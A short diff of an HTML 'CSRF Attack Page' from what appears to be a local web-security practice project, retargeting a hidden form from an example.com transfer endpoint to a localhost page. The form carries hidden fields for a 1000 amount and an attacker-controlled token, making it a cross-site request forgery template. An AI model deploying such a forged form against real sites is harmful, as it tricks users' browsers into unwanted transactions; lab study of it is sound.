@@ -10,7 +10,7 @@
 
 <body>
 	<h1>CSRF Attack Page</h1>
-	<form id="csrfForm" action="http://example.com/transfer" method="post">
+	<form id="csrfForm" action="http://localhost:8080/sideproject-websecurity/crlf.html" method="get">
 		<input type="hidden" name="amount" value="1000">
 		<!-- The CSRF token value should be obtained from the victim's session or other trusted source -->
 		<input type="hidden" name="csrfToken" value="attacker-controlled-token">
